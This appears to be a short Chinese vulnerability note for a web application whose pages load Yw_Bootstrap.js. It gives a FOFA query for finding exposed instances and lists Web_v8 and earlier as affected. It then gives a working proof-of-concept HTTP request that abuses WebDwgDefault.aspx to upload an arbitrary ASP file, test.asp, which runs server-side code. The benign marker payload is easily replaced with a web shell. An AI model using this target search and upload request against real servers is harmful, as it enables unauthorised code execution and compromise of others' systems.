FOFA

```
body="/Resource/Scripts/Yw/Yw_Bootstrap.js"
```

影响版本

```
Web_v8及以下版本（其他版本需进一步验证）
```

POC

```
# 文件上传位置：/test.asp
POST /WebDwgDefault.aspx?IsSave=true&FileName=test.asp HTTP/1.1
Host: ip:port
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36
Accept: application/json, text/javascript, */*; q=0.01
Content-Type: multipart/form-data; boundary=----123
Content-Length: 331

------123
Content-Disposition: form-data; name="file"; filename="aaaaaaaaa.txt"

<% 
Response.Write("vmvtjelciqfadnyakpjmdduxscigdaee")
%>
------123--
```